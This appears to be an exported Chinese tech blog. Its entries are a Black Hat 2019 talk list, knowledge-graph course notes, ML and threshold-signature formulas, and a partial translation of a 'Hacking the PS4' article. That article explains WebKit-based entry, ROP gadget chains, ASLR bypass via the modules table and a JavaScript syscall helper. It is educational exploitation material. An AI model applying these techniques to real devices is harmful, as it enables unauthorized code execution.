FwAnalyzer 的详细介绍，针对文件系统的静态分析，并不针对漏洞发现，会检测一些文件的权限，是否包含一些安全机制等，并形成一个分析报告。 Collin Mulliner Hardware/Embedded,Security Development Lifecycle 95 Preventing Authentication Bypass: A Tale of Two Researchers Ravi Jaiswal,Ron Chan,Terry Zhang Applied Security,Security Development Lifecycle 96 Securing the System: A Deep Dive into Reversing Android Pre-Installed AppsGoogle Project Zero，Android 系统预装 App 的逆向深度分析 Maddie Stone Reverse Engineering,Mobile 97 Towards Discovering Remote Code Execution Vulnerabilities in Apple FaceTime盘古，Apple FaceTime 的架构、相关攻击面以及一些漏洞 Tielei Wang,Tao Huang Exploit Development 98 Finding a Needle in an Encrypted Haystack: Leveraging Cryptographic Abilities to Detect the Most Prevalent Attacks on Active Directory Yaron Zinar,Marina Simakov Network Defense,Enterprise 99 A Compendium of Container Escapes一篇针对容器逃逸的概述，主要内容包括了 linux 内核容器基础，执行逃逸，docker、RunC等容器的漏洞以及内核漏洞利用的研究 Nick Freeman,Brandon Edwards Exploit Development,Platform Security 100 Adventures in the Underland: The CQForensic Toolkit as a Unique Weapon Against Hackers Paula Januszkiewicz Data Forensics/Incident Response 101 Attacking iPhone XS Max这个议题介绍了 UNIX socket bind 操作因临时 unlock 引发的竞争条件，最终导致了一个 UAF 漏洞，作者介绍了该漏洞在 A12 之前和之后的漏洞利用方法 Hao Xu,Tielei Wang Exploit Development,Mobile 102 Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs Meh Chang,Orange Tsai Web AppSec,Enterprise 103 Everybody be Cool, This is a Robbery! Jean-Baptiste Bédrune,Gabriel Campana Hardware/Embedded 104 Hacking Ten Million Useful Idiots: Online Propaganda as a Socio-Technical Security Project Pablo Breuer,David Perlman Policy,Human Factors 105 Integration of Cyber Insurance Into A Risk Management Program Jake Kouns Cyber Insurance 106 HostSplit: Exploitable Antipatterns in Unicode Normalization Jonathan Birch Applied Security,Web AppSec 107 Lessons From Two Years of Crypto Audits Jean-Philippe Aumasson Security Development Lifecycle,Cryptography 108 Securing Apps in the Open-By-Default Cloud Michael Wozniak,Winston Howes Enterprise,Security Development Lifecycle 109 Look, No Hands! – The Remote, Interaction-less Attack Surface of the iPhone Natalie Silvanovich Mobile,Exploit Development 110 The Discovery of a Government Malware and an Unexpected Spy Scandal Lorenzo Franceschi-Bicchierai Mobile,Malware 111 MITRE ATT&amp;CK: The Play at Home Edition Ryan Kovar,Katie Nickels Data Forensics/Incident Response,Applied Security 112 The Future of ATO Philip Martin Web AppSec,Applied Security 113 Breaking Samsung’s ARM TrustZone Joffrey Guilbon,Alexandre Adamski,Maxime Peterlin Hardware/Embedded,Mobile 114 Responding to a Cyber Attack with Missiles Mikko Hypponen Policy 115 Worm Charming: Harvesting Malware Lures for Fun and Profit Pedram Amini Applied Security,Malware 116 Command Injection in F5 iRules Christoffer Jerkeby Web AppSec,Network Defense 117 Debug for Bug: Crack and Hack Apple Core by Itself - Fun and Profit to Debug and Fuzz Apple Kernel by lldb Script使用苹果自带的 LLDB Script fuzz macOS 系统内核 Moony Li,Lilang Wu Platform Security 118 Arm IDA and Cross Check: Reversing the Boeing 787’s Core Network Ruben Santamarta Hardware/Embedded,Reverse Engineering 119 Exploring the New World : Remote Exploitation of SQLite and Curl HuiYu Wu,YuXiang Li,Wenxiang Qian Internet of Things,Exploit Development 120 Controlled Chaos: The Inevitable Marriage of DevOps &amp; Security Nicole Forsgren,Kelly Shortridge Applied Security,Security Development Lifecycle 121 How to Detect that Your Domains are Being Abused for Phishing by Using DNS Karl Lovink,Arnold Hölzel Policy,Applied Security 122 Every Security Team is a Software Team Now Dino Dai Zovi Keynote 123 A Decade After Bleichenbacher ‘06, RSA Signature Forgery Still Works Sze Yiu Chau Web AppSec,Cryptography]]></content>
      <categories>
        <category>安全会议</category>
      </categories>
      <tags>
        <tag>安全会议</tag>
        <tag>blackhat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[知识图谱完整项目实战-笔记]]></title>
    <url>%2F2019%2F08%2F08%2F%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%8C%E6%95%B4%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[网易云课堂地址 基础理论篇完整项目案例运行演示案例驱动：汽车领域知识图谱 实战开发：知识抽取、建模、推理、存储、应用 源码剖析 案例效果： 实体识别（通用和领域）、中文分词、词性标注 实体查询（关系图） 关系查询（关系图） 项目开发环境安装部署 建议Djnago和Neo4j运行在同一服务器上 项目业务需求分析 基于搜索引擎的商业数据分析 项目总体架构设计 ETL(Extract-Transform-Load, 数据仓库技术)：将数据从来源端经过提取（extract）、转换（transform）、加载（load）至目的端 数据源：结构化数据 &gt; 半结构化数据 &gt; 非结构化数据 网络爬虫：Scrapy 模型设计篇知识图谱模型设计 参照法：UMLS（一体化医学语言系统），TCMLS（中医药学语言系统） 归纳法：产品生命周期，业务流程拆解 知识图谱语义类型设计 高层抽象可复用（参照与对标） 现象或过程：被动 活动：主动 底层明细需适配（归纳法） 知识图谱语义关系设计方法同上 知识获取篇 网络爬虫：动态页面，爬虫与反爬虫 数据导入：Neo4j 数据资产 开发环境安装部署 PyCharm requests-html 汽车品牌数据获取 页面元素分析1url = 'https://car.autohome.com.cn/' 汽车车系数据获取汽车数据批量导入品牌数据导入 将.csv放入/var/lib/neo4j/import LOAD CSV WITH HEADERS FROM &quot;file:///bank.csv&quot; AS line CREATE (:Bank {name:line.bank, count:line.count}) 车系数据导入 将.csv放入/var/lib/neo4j/import LOAD CSV WITH HEADERS FROM &quot;file:///series.csv&quot; AS line CREATE (:Series {name:line.series, count:line.count}) 关系数据导入 LOAD CSV WITH HEADERS FROM &quot;file:///series.csv&quot; AS line MATCH (a:Bank{name:line.bank}), (b:Series {name:line.series}) CREATE (a)-[:Subtype]-&gt;(b) 创建索引 CREATE CONSTRAINT ON (b:Bank) ASSERT b.name IS UNIQUE 汽车车型数据获取汽车配置数据获取程序设计篇 Web前端框架：django 实体关系查询，命名实体查询 图数据可视化：Echarts web前端框架设计123urls.py -&gt; *view.py -&gt; templatespython manage.py runserver 0:8000 通用领域命名实体识别 三大类：实体类、时间类、数字类 七小类：人名、机构名、地名、时间、日期、货币、百分比 基于词典的方法 词性标注 THULAC：一个高效的中文词法分析工具包12345n/名词 np/人名 ns/地名 ni/机构名 nz/其它专名m/数词 q/量词 mq/数量词 t/时间词 f/方位词 s/处所词v/动词 a/形容词 d/副词 h/前接成分 k/后接成分 i/习语 j/简称 r/代词 c/连词 p/介词 u/助词 y/语气助词e/叹词 o/拟声词 g/语素 w/标点 x/其它 开源框架CoreNLP java 基于CRF /O表示非实体 1java -mx600m -cp standford-ner-3.9.1.jar edu.stanford.nlp.ie.NERClassifierCombiner -ner.model classifiers/chinese.kbp.distsim.crf.ser.gz -inputEncoding gb18030 -textFile test.txt 垂直领域命名实体识别汽车领域命名实体词典设计和应用（生产环境） 实体查询程序设计 Neo4j开发驱动 Py2neo开发框架 run() data() neo4j_models.py 关系查询程序设计知识图谱数据可视化 可视化方案：D3和Echarts Echarts 知识图谱应用推荐系统基本原理和实现机制推荐系统类型 类型 算法 优势 劣势 案例 基于交易历史 协同过滤 准确性高 冷启动 商品推荐（啤酒与尿布） 基于行为轨迹 协同过滤 数据密集 准确性低 内容推荐 基于知识图谱 相似计算 冷热无关 知识建模 商品推荐 知识图谱与推荐系统融合的模式融合方式 方式 算法 优势 案例 基于实体属性 实体相似 线索拓展 同一价位 基于实体关系 实体相关 线索拓展 同一品牌 基于特征向量 水波算法 线索拓展 RippleNet 依次训练、联合训练、交替训练 基于KGE的开源推荐系统框架RippleNet基于KGE的联合训练推荐框架工作原理和实现机制 绿色条状为输出，最后形成用户向量，并与物品向量计算相似度。 Hop 节点向出度方向跳跃一次，形成Ripple集合。 对于给定的用户u和物品v，我们将历史相关实体集合V中的所有实体进行相似度计算，并利用计算得到的权重值对V中实体在知识图谱中对应的尾节点进行加权求和。求和得到的结果可以视为v在u的一跳相关实体中的一个响应。该过程可以重复在u的二跳、三跳相关实体中进行，如此v在知识图谱上便以V为中心逐层向外扩散。 RippleNet中没有对用户直接使用向量进行刻画，而是用用户点击过的物品向量集合作为其特征。 RippleNet开源框架源码剖析RippleNet tensorflow]]></content>
      <categories>
        <category>知识图谱</category>
      </categories>
      <tags>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI 算法中的数学公式]]></title>
    <url>%2F2019%2F05%2F24%2FAI%E7%AE%97%E6%B3%95%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[AI 算法中的一些数学公式 DDPG$$\begin{aligned}\nabla_{\theta^\mu}J&amp;\approx\mathbb{E}_{s_t\backsim\rho^\beta}[\nabla_{\theta^\mu}Q(s,a|\theta^Q)|_{s=s_t,a=\mu(s_t|\theta^\mu)}] \\&amp;=\mathbb{E}_{s_t\backsim\rho^\beta}[\nabla_{a}Q(s,a|\theta^Q)|_{s=s_t,a=\mu(s_t)}\nabla_{\theta_\mu}\mu(s|\theta^\mu)|_{s=s_t}]\end{aligned}$$ GEN$$g=&lt;V,E,\phi&gt;$$ $$\forall v\in V,v\rightarrow x_v\rightarrow \mu_v$$ $$N_v$$ $$\mu_v=F(x_v,\sum_{j\in N_v}\mu_j)$$ $$P=\lbrace P_1,P_2,\cdots,P_n\rbrace$$ $$ReLU(\cdot)=max\lbrace 0,\cdot\rbrace$$ $$\mu_v^{(t)}=tanh(W_1x_v+\sigma(\sum_{j\in N_v}\mu_j^{(t-1)}))$$ $$\sigma(x)=P_1ReLU(P_2\cdots ReLU(P_n(x)))$$ $$\mu_g=W_2\sum_{v\in V}\mu_v^T$$ $$Z=W_3\mu_g$$ $$Q=\lbrace p,1-p\rbrace,p\in[0,1]$$ $$Q=Softmax(Z)$$ $$\min_{W_1,W_2,W_3,…,P_1,P_2,…,P_n}\sum_{i=1}^m(H(Q,l))$$ 在这里将Markdown的公式转换为MathML代码（Word）参考]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>数学原理</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[秘密共享及门限签名]]></title>
    <url>%2F2019%2F05%2F14%2F%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB%E5%8F%8A%E9%97%A8%E9%99%90%E7%AD%BE%E5%90%8D%2F</url>
    <content type="text"><![CDATA[Elgamal 签名算法 $\rightarrow$ Harn 的门限签名方案 RSA $\rightarrow$ Shoup 门限签名方案 Asmuth-Bloom 法 Karnin-Greene-Hellman 法 Shamir 门限法（拉格朗日插值法） Elgamal 签名算法依赖有限域上的离散指数的难计算性，即设$g$为素数$p$的模循环群的原根，对任意的$a$，计算： $$b=g^a\bmod p$$ 是容易的（通过幂取模算法）。反过来，给定$b$计算满足上式的$a$是非常困难的，$a$称为以$g$为基$b$的离散对数。 初始化Alice随机选择大素数$p$和$1$到$p$之间的整数$x$，找出有限域$Z_p$的一个生成元$g$，计算： $$y=g^x\bmod p$$ 则公钥为$y$，私钥为$x$。 签名设待签名消息为$m$，Alice随机选择整数$k$，满足$k&lt;p$，$gcd(k,p-1)=1$。计算： $$r=g^k\bmod p$$$$s=(m-xr)k^{-1}\bmod p$$ 将$m$的签名$(r,s)$发送给Bob。 验证Bob收到$(r,s)$，利用Alice的公钥$y$验证等式： $$g^m\equiv y^rr^s\bmod p$$ 若等式成立则签名有效。 Harn 的门限签名方案初始化假设有$n$个成员$P_1,P_2,\cdots,P_n$，$t$为门限值，$p$、$q$为大素数，$q|(p-1)$，$g$为有限域$Z_p$上的$q$阶生成元，$h$是$g$的循环群中的一个数，待签名消息为$m$，每个成员随机选择$z_i$和$x_i$，计算： $$y_i=g^{z_i}\bmod p$$ 成员$P_i$私钥为$z_i$，组公钥$y$计算如下： $$y=\prod_{i=1}^ny_i\bmod p$$ $P_i(i=1,2,\cdots,n)$选取一个$t-1$次多项式：$f_i(x)=z_i+a_{i,1}x+a_{i,2}x^2+\cdots+a_{i,t-1}x^{t-1}$，计算影子份额$f_i(x_j)\bmod q$发送给$P_j$，并计算验证信息： $$y_{i,j}=g^{f_i(x_j)}\bmod p$$ 产生部分签名设参与签名的成员$P_1,P_2,\cdots,P_t$。成员$P_i(i=1,2,\cdots,t)$选择一个随机数$k_i\in[1,q-1]$，计算$r_i=g^{k_i}\bmod p$并将其广播给所有成员。 收到其他成员广播的$r_i$后，$P_i$计算 $$r=\prod_{i=1}^tr_i\bmod p$$ 通过自己的私钥$z_i$、$k_i$、份额$f_j(x_i)(j=t+1,t+2,\cdots,n)$计算： $$s_i=z_i+\lbrace\sum_{j=t+1}^nf_j(x_i)(\prod_{k=1,k\neq i}^t\frac{-x_k}{x_k-x_j})\rbrace m-k_i r\bmod q$$ 将部分签名$(r_i,s_i)$发送给签名合成者。 合成者收到$\lbrace r_i,s_i\rbrace$后，通过下式验证其有效性： $$\lbrace y_i(\prod_{j=t+1}^ny_{j,i})^{\prod_{k=1,k\neq i}^t\frac{-x_k}{x_i-x_k}}\rbrace^m=r_i^r g^{s_j}\bmod p$$ 若验证式成立，则收到的部分签名$\lbrace r_i,s_i\rbrace$有效。 产生组签名合成者确认接收到$t$个正确的部分签名后，计算： $$s=\sum_{i=1}^ts_i\bmod q$$ 将$\lbrace r,s\rbrace$作为消息$m$的组签名。 验证签名验证者收到组签名后，验证其有效性： $$y^m=r^r g^s \bmod p$$ 每个参与者拥有的数$$P_1\begin{cases}z_1\stackrel{}{\longrightarrow} y_1\stackrel{}{\longrightarrow} y \ f_1(x)\stackrel{x_j}{\longrightarrow} f_1(x_j){\longrightarrow} y_{1,j} \ f_j(x_1) {\longrightarrow} y_{j,1} \ k_1\stackrel{}{\longrightarrow} r_1 \stackrel{r_j}{\longrightarrow} r \ \end{cases}$$ Shoup 门限签名方案RSA 体制中$p,q$为安全大素数，即存在大素数$p’,q’$使得$p=2p’+1$，$q=2q’+1$，记$m=p’q’$。 初始化可信中心TC随机选取次数不超过$t-1$的多项式 $$f(x)=\sum_{j=0}^{t-1}a_jx^j\in Z_m[x]$$ 其中$a_0=d$，$a_j\in Z_m(j=1,2,\cdots,n)$。 TC计算$d_i$，并将其发送给成员$P_i$： $$d_i=f(i)\bmod m$$ 同时计算$\pi=n!$。 TC公开$N$、$e$、$\pi$。 产生部分签名成员$P_i$计算消息摘要$x=H(M)$，然后计算： $$x_i=x^{2\pi d_i}\bmod N$$ 产生组签名若有$t$个成员$P_i(i\in B,|B|=t)$产生正确的部分签名$s_i(i\in B)$，则计算 $$y=\prod_{i=1}^tx_i^{2\pi \lambda_{0,i}}\bmod N=x^{4\pi^2d}\bmod N$$ 令$e’=4\pi^2$，由欧几里得定理可知存在$a$，$b$使得$gcd(e,e’)=1$，即$ae+be’=1$，最终签名： $$s=y^bx^a\bmod N$$ 验证签名验证门限签名$(M,s)$时，验证以下等式是否正确： $$s^e=H(M)\bmod N$$ Asmuth-Bloom 法初始化假设$S$为共享秘密，$DCA$为秘密分发者，有$n$个成员$P_1,P_2,\cdots,P_n$，$t$为恢复秘密的门限值。$DC$选择大素数$q$和严格递增的序列$d=\lbrace d_1,d_2,\cdots,d_n\rbrace$，$d$满足如下条件： $$d_1&lt;d_2&lt;\cdots&lt;d_n$$ $$(d_i,d_j)=1,(i\neq j)$$ $$(d_i,q)=1,(i=1,2,\cdots,n)$$ $$\prod_{i=1}^td_i&gt;q\prod_{i=1}^{t-1}d_{n-i+1}$$ 秘密分发令$M=\prod_{i=1}^td_i$，选择满足式$0\leq A\leq \frac{M}{q}-1$的整数$A$，$DC$计算： $$Z=S+Aq$$ $$Z_i=Z\bmod d_i,i=1,2,\cdots,n$$ 并将$(Z_i,d_i)$作为秘密份额发给成员$P_i,(i=1,2,\cdots,n)$。 秘密恢复选取$t$个成员$\lbrace P_1,P_2,\cdots,P_t\rbrace$参与秘密的恢复，通过交换秘密份额，任意成员$P_i$可以建立同余方程组： $$\begin{cases}Z_1=Z\bmod d_1 \\Z_2=Z\bmod d_2 \\\vdots \\Z_t=Z\bmod d_t\end{cases}$$ 由$CRT$可知该方程组有唯一解： $$Z=\sum_{i=1}^t\frac{D}{d_i}\cdot e_i\cdot Z_i\bmod D,i=1,2,..,t$$ 其中： $$D=\prod_{i=1}^td_i$$ $$\frac{D}{d_i}\cdot e_i \equiv 1\bmod d_i,i=1,2,\cdots,t$$ 可求出共享秘密$S=Z\bmod q$。 Karnin-Greene-Hellman 法产生主次密钥(m,n) 信任单位产生$n+1$个任意$n\times\frac{n}{m}$维矩阵，矩阵元素为$0$或$1$，分别为$\lbrace A_1,A_2,\cdots,A_n\rbrace$ 信任单位产生$1$个任意$1\times n$维矩阵$U$ 产生n个次密钥$V_i=U\times A_i$，不可暴露，分别保存 主密钥为$K=U\times A_0$ 公开矩阵$\lbrace A_1,A_2,\cdots,A_n\rbrace$ 密钥恢复 选取m组次密钥$\lbrace V_1,V_2,\cdots,V_m\rbrace$ 拼接矩阵$A=[A_1|A_2|\cdots|A_m]$ 计算逆矩阵$A^{-1}$ 计算$U=[V_1|V_2|\cdots|V_m]\times A^{-1}$ 计算$K=U\times A_0$ Shamir 门限法秘密分发任取$a_1,a_2,\cdots,a_{t-1}\in GF(q)$构造一个多项式： $$f(x)=(d+a_1x+a_2x^2+\cdots+a_{t-1}x^{t-1})modq$$ 其中$d$为密钥，计算$d_i=f(i)(i=1,2,\cdots,n)$，称$d_i$为部分密钥，将$d_i$分别通过安全的信道发送给每个分享者$P_i(=1,2,\cdots,n)$。 秘密恢复如果有$k$个共享者想恢复秘密信息$d$，他们分别拿出自己的$d_i$，然后利用Lagrange插值公式： $$h(x)=\sum_{i=1}^td_i\lambda_{x,i}$$ 其中$\lambda_{x,i}=\prod_{k=1,k\neq j}^t\frac{i-k}{j-k}$，由$d=f(0)=h(0)$得到秘密信息$d$。]]></content>
      <categories>
        <category>密码学基础</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>数字签名</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破解 PS4 - 第一部分：PS4 安全和用户态 ROP 简介]]></title>
    <url>%2F2019%2F05%2F06%2F%E7%A0%B4%E8%A7%A3-PS4-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[原文标题 Hacking the PS4, part 1 Introduction to PS4’s security, and userland ROP (日期未知) 作者：CTurt 由于目前很长时间没有关于 PS4 破解的重大公告，我想解释一下 PS4 破解已经走了多远，以及阻止它进一步发展的原因。 我将解释一些通用于所有现代系统的安全概念，以及我在 PS4 上运行 ROP 测试所做的发现。 本系列文章的目标是展示完整的漏洞利用链，从访问 Internet 浏览器的网页，到最终在 PS4 上实现内核代码执行。 如果您对漏洞挖掘不是特别熟悉，那么您应该先阅读我的关于通过保存文件中的栈粉碎漏洞来破解 DS 游戏的文章。 您可以在此下载我的完整设置以自行运行这些测试；它目前仅适用于固件 1.76。如果您正在使用较旧的固件并希望更新到 1.76，则可以下载 1.76 PUP 文件并通过 USB 更新。 PS4 背景 您可能知道 PS4 使用的是定制的 AMD x86-64 CPU（8核），即使此特定版本可能与已知标准稍有不同，目前仍有许多研究成果可用于此 CPU 架构。 例如，PFLA（Page Fault Liberation Army）在 29C3 大会期间发布了仅使用页错误和 x86 MMU 实现完整图灵机的概念证明，您可以在 YouTube 上查看他们的精彩视频。 如果您尝试在虚拟机中运行代码并希望在主机 CPU 上执行指令，也会很有趣。 – EurAsia 新闻 3251 号文章 除了表现良好的 CPU 架构外，PS4 中使用的大部分软件都是开源的。 最值得注意的是，PS4 的 Orbis OS 基于 FreeBSD 9.0，就像 PS3 的操作系统一样（也有部分 NetBSD）；并包括各种许多其他开源软件，如 Mono VM 和 WebKit。 从 WebKit 入手WebKit 是开源的布局引擎，它被用于 iOS，Wii U，3DS，PS Vita 和 PS4 的浏览器中来呈现网页。 尽管 WebKit 被广泛使用，但它确实存在漏洞；通过阅读 Pwn2Own write-ups，你可以了解其中的许多内容。 特别是 PS4 1.76 版本固件中的浏览器使用的 WebKit 版本易受到 CVE-2012-3748 的攻击，这是由 JSArray :: sort(...) 方法中基于堆的缓冲区溢出造成的。 2014年，NAS 和 Proxima 宣布他们已经成功地将一个利用该漏洞破解 Mac OS X Safari 代码移植到 PS4 的浏览器，并公布了作为破解 PS4 第一个入口点的 PoC 代码。 这使我们可以任意读写 WebKit 进程可以读取和写入的内容，这些内容可以用于转储模块，并覆盖栈上的返回地址，让我们控制指令指针寄存器（rip）来实现 RO P执行。 从那时起，WebKit 中发现了许多其他漏洞，这些漏洞可能被用作 PS4 后期固件的入口点，但截至撰写时，没有人公开宣称将任何这些漏洞利用代码移植到 PS4。 如果您从未登录 PSN，您的 PS4 将无法打开 Internet 浏览器，但您可以转到“设置”，然后选择“用户指南”打开功能有限的 Web 浏览器视图，您可以用代理控制其中的内容。 ROP 是什么？与 DS 等早期设备不同，PS4 有一个内核来控制内存不同区域的属性。其中标记为可执行的内存页面不能被覆写，并且标记为可写的内存页面不能被执行; 这称为数据执行保护（DEP）。 这意味着我们不能只将有效负载复制到内存中并执行。但是，我们可以执行已加载到内存中并标记为可执行的代码。 如果我们不能将自己的代码编写到某个地址地址，那么跳转到该地址并不是非常有用，因此我们使用 ROP。 ROP（Return-Oriented Programming）是传统栈粉碎技术的扩展，我们可以将许多不同的地址（称为 gadgets）链接在一起，而不是仅覆盖 rip 将跳转到的单个值。 一条 gadget 通常只是一个所需的指令以及一个 ret。 在 x86_64 程序集中，当到达 ret 指令时，程序会从栈中弹出一个 64 位的值并且将 rip 跳转到它；由于我们可以控制堆栈，所以我们可以使每个 ret 指令跳转到下一个所需的 gadget。 例如 0x80000 处： mov rax, 0 ret 0x90000 处： mov rbx, 0 ret If we overwrite a return address on the stack to contain 0x80000 followed by 0x90000, then as soon as the first ret instruction is reached execution will jump to mov rax, 0, and immediately afterwards, the next ret instruction will pop 0x90000 off the stack and jump to mov rbx, 0. Effectively this chain will set both rax and rbx to 0, just as if we had written the code into a single location and executed it from there. ROP chains aren’t just limited to a list of addresses though; assuming that from 0xa0000 contains these instructions: pop rax ret We can set the first item in the chain to 0xa0000 and the next item to any desired value for rax. Gadgets also don’t have to end in a ret instruction; we can use gadgets ending in a jmp: add rax, 8 jmp rcx By making rcx point to a ret instruction, the chain will continue as normal: chain.add(&quot;pop rcx&quot;, &quot;ret&quot;); chain.add(&quot;add rax, 8; jmp rcx&quot;); Sometimes you won’t be able to find the exact gadget that you need on its own, but with other instructions after it. For example, if you want to set r8 to something, but only have this gadget, you will have to set r9 to some dummy value: pop r8 pop r9 ret Although you may have to be creative with how you write ROP chains, it is generally accepted that within a sufficiently large enough code dump, there will be enough gadgets for Turing-complete functionality; this makes ROP a viable method of defeating DEP. 寻找 gadgetsThink of ROP as writing a new chapter to a book, using only words that have appeared at the end of sentences in the previous chapters. It’s obvious from the structure of most sentences that we probably won’t be able to find words like ‘and’ or ‘but’ appearing at the end of any sentences, but we will need these connectives in order to write anything meaningful. It is quite possible however, that a sentence has ended with ‘sand’. Although the author only ever intended for the word to be read from the ‘s’, if we start reading from the ‘a’, it will appear as an entirely different word by coincidence, ‘and’. These principles also apply to ROP. Since almost all functions are structured with a prologue and epilogue: ; Save registers push rbp mov rbp, rsp push r15 push r14 push r13 push r12 push rbx sub rsp, 18h ; Function body ; Restore registers add rsp, 18h pop rbx pop r12 pop r13 pop r14 pop r15 pop rbp ret You’d expect to only be able to find pop gadgets, or more rarely, something like xor rax, rax to set the return value to 0 before returning. Having a comparison like: cmp [rax], r12 ret Wouldn’t make any sense since the result of the comparison isn’t used by the function. However, there is still a possibility that we can find gadgets like these. x86_64 instructions are similar to words in that they have variable lengths, and can mean something entirely different depending on where decoding starts. The x86_64 architecture is a variable-length CISC instruction set. Return-oriented programming on the x86_64 takes advantage of the fact that the instruction set is very “dense”, that is, any random sequence of bytes is likely to be interpretable as some valid set of x86_64 instructions. – Wikipedia To demonstrate this, take a look at the end of this function from the WebKit module: 000000000052BE0D mov eax, [rdx+8] 000000000052BE10 mov [rsi+10h], eax 000000000052BE13 or byte ptr [rsi+39h], 20h 000000000052BE17 ret Now take a look at what the code looks like if we start decoding from 0x52be14: 000000000052BE14 cmp [rax], r12 000000000052BE17 ret Even though this code was never intended to be executed, it is within an area of memory which has been marked as executable, so it is perfectly valid to use as a gadget. Of course, it would be incredibily time consuming to look at every possible way of interpreting code before every single ret instruction manually; and that’s why tools exist to do this for you. The one which I use to search for ROP gadgets is rp++; to generate a text file filled with gadgets, just use: rp-win-x64 -f mod14.bin --raw=x64 --rop=1 --unique &gt; mod14.txt General protection faultsIf we _do_ perform an access violation, such as by trying to execute a non-executable page of memory, or by trying to write to a non-writable page of memory, a general protection fault, or more specifically in this instance, a segmentation fault, will occur. For example, trying to execute code on the stack, which is mapped as read and write only: setU8to(chain.data + 0, 0xeb); setU8to(chain.data + 1, 0xfe); chain.add(chain.data); And trying to write to code, which is mapped as read and execute only: setU8to(moduleBases[webkit], 0); If a general protection fault occurs, a message saying “There is not enough free system memory” will appear, and the page will fail to load: This message will also be displayed for other hard faults, such as division by 0, or execution of an invalid instruction or unimplemented system call, but most commonly it will be encountered by performing a segmentation fault. ASLRAddress Space Layout Randomization (ASLR) is a security technique which causes the base addresses of modules to be different every time you start the PS4. It has been reported to me that very old firmwares (1.05) don’t have ASLR enabled, but it was introduced sometime before firmware 1.70. Note that kernel ASLR is not enabled (for firmwares 1.76 and lower at least), which will be proved later in the article. For most exploits ASLR would be a problem because if you don’t know the addresses of the gadgets in memory, you would have no idea what to write to the stack. Luckily for us, we aren’t limited to just writing static ROP chains. We can use JavaScript to read the modules table, which will tell us the base addresses of all loaded modules. Using these bases, we can then calculate the addresses of all our gadgets before we trigger ROP execution, defeating ASLR. The modules table also includes the filenames of the modules: WebProcess.self libkernel.sprx libSceLibcInternal.sprx libSceSysmodule.sprx libSceNet.sprx libSceNetCtl.sprx libSceIpmi.sprx libSceMbus.sprx libSceRegMgr.sprx libSceRtc.sprx libScePad.sprx libSceVideoOut.sprx libScePigletv2VSH.sprx libSceOrbisCompat.sprx libSceWebKit2.sprx libSceSysCore.sprx libSceSsl.sprx libSceVideoCoreServerInterface.sprx libSceSystemService.sprx libSceCompositeExt.sprx Although the PS4 predominantly uses the [Signed] PPU Relocatable Executable ([S]PRX) format for modules, some string references to [Signed] Executable and Linking Format ([S]ELF) object files can also be found in the libSceSysmodule.sprx dump, such as bdj.elf, web_core.elf and orbis-jsc-compiler.self. This combination of modules and objects is similar to what is used in the PSP and PS3. You can view a complete list of all modules available (not just those loaded by the browser) in libSceSysmodule.sprx. We can load and dump some of these through several of Sony’s custom system calls, which will be explained later in this article. JuSt-ROPUsing JavaScript to write and execute dynamic ROP chains gives us a tremendous advantage over a traditional, static buffer overflow attack. As well as being necessary to defeat ASLR, JavaScript also lets us read the user agent of the browser, and provide different ROP chains for different browser versions, giving our exploit a greater range of compatibility. We can even use JavaScript to read the memory at our gadgets’ addresses to check that they are correct, giving us almost perfect reliability. Theoretically, you could take this even further by writing a script to dynamically find ROP gadgets and then build ROP chains on the fly. Writing ROP chains dynamically, rather than generating them with a script beforehand, just makes sense. I created a JavaScript framework for writing ROP chains, JuSt-ROP, for this very reason. JavaScript caveatsJavaScript represents numbers using the IEEE-754 double-precision (64 bit) format. This provides us with 53 bit precision, meaning that it isn’t possible to represent every 64 bit value, approximations will have to be used for some. If you just need to set a 64 bit value to something low, like 256, then setU64to will be fine. But for situations in which you need to write a buffer or struct of data, there is the possibility that certain bytes will be written incorrectly if it has been written in 64 bit chunks. Instead, you should write data in 32 bit chunks (remembering that the PS4 is little endian), to ensure that every byte is exact. 系统调用Interestingly, the PS4 uses the same calling convention as Linux and MS-DOS for system calls, with arguments stored in registers, rather than the traditional UNIX way (which FreeBSD uses by default), with arguments stored in the stack: rax - System call number rdi - Argument 1 rsi - Argument 2 rdx - Argument 3 r10 - Argument 4 r8 - Argument 5 r9 - Argument 6 We can try to perform any system call with the following JuSt-ROP method: this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) { console.log(&quot;syscall &quot; + name); this.add(&quot;pop rax&quot;, systemCallNumber); if(typeof(arg1) !== &quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1); if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2); if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3); if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4); if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5); if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6); this.add(&quot;mov r10, rcx; syscall&quot;); } Just make sure to set the stack base to some free memory beforehand: this.add(&quot;pop rbp&quot;, stackBase + returnAddress + 0x1400); Using system calls can tell us a huge amount about the PS4 kernel. Not only that, but using system calls is most likely the only way that we can interact with the kernel, and thus potentially trigger a kernel exploit. If you are reverse engineering modules to identify some of Sony’s custom system calls, you may come across an alternative calling convention: Sometimes Sony performs system calls through regular system call 0 (which usually does nothing in FreeBSD), with the first argument (rdi) controlling which system call should be executed: rax - 0 rdi - System call number rsi - Argument 1 rdx - Argument 2 r10 - Argument 3 r8 - Argument 4 r9 - Argument 5 It is likely that Sony did this to have easy compatibility with the function calling convention. For example: .global syscall syscall: xor rax, rax mov r10, rcx syscall ret Using this, they can perform system calls from C using the 